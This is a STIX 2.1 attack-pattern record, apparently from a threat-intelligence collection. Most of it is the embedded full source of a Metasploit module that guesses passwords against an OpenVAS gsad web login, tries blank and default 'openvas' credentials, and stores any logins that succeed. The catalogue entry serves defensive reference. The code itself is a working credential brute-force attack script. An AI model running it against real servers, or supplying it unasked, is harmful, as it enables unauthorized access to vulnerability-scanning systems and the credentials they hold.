{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ee81125-f92c-45d1-8363-bcb87f8d118f",
    "created": "2024-08-14T16:31:13.640174Z",
    "modified": "2024-08-14T16:31:13.640178Z",
    "name": "OpenVAS gsad Web Interface Login Utility",
    "description": " This module simply attempts to login to an OpenVAS gsad interface using a specific user/pass. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/openvas/openvas_gsad_login.rb",
            "external_id": "openvas_gsad_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'OpenVAS gsad Web Interface Login Utility',\n      'Description'    => %q{\n        This module simply attempts to login to an OpenVAS gsad interface\n        using a specific user/pass.\n      },\n      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('URI', [true, \"URI for OpenVAS omp login. Default is /omp\", \"/omp\"]),\n        OptBool.new('BLANK_PASSWORDS', [false, \"Try blank passwords for all users\", false]),\n      ])\n\n    register_advanced_options(\n    [\n      OptString.new('OMP_text', [true, \"value for OpenVAS omp text login hidden field\", \"/omp?cmd=get_tasks&amp;overrides=1\"]),\n      OptString.new('OMP_cmd', [true, \"value for OpenVAS omp cmd login hidden field\", \"login\"])\n    ])\n  end\n\n  def run_host(ip)\n    begin\n      res = send_request_cgi({\n        'uri'     => datastore['URI'],\n        'method'  => 'GET'\n        }, 25)\n      http_fingerprint({ :response => res })\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"#{msg} #{datastore['URI']} - #{e}\")\n      return\n    end\n\n    if not res\n      vprint_error(\"#{msg} #{datastore['URI']} - No response\")\n      return\n    end\n    if res.code != 200\n      vprint_error(\"#{msg} - Expected 200 HTTP code - not gsad?\")\n      return\n    end\n    if res.body !~ /Greenbone Security Assistant \\(GSA\\)/\n      vprint_error(\"#{msg} - Expected GSA keyword on page - not gsad?\")\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def do_login(user='openvas', pass='openvas')\n    vprint_status(\"#{msg} - Trying username:'#{user}' with password:'#{pass}'\")\n    headers = {}\n    begin\n      res = send_request_cgi({\n        'encode'   => true,\n        'uri'      => datastore['URI'],\n        'method'   => 'POST',\n        'headers'  => headers,\n        'vars_post' => {\n          'cmd' => datastore['OMP_cmd'],\n          'text' => datastore['OMP_text'],\n          'login' => user,\n          'password' => pass\n        }\n      }, 25)\n\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"#{msg} HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n\n    if not res\n      print_error(\"#{msg} HTTP Connection Error - res, Aborting\")\n      return :abort\n    end\n\n    # vprint_status(\"#{msg} GOT BODY. '#{user}' : '#{pass}' - #{res.code} #{res.body}\")\n\n    if res.code == 303\n      print_good(\"#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n\n      report_cred(\n        ip: datastore['RHOST'],\n        port: datastore['RPORT'],\n        service_name: 'openvas-gsa',\n        user: user,\n        password: pass,\n        proof: res.code.to_s\n      )\n      return :next_user\n    end\n    vprint_error(\"#{msg} FAILED LOGIN. '#{user}' : '#{pass}'\")\n    return :skip_pass\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def msg\n    \"#{vhost}:#{rport} OpenVAS gsad -\"\n  end\nend\n"
}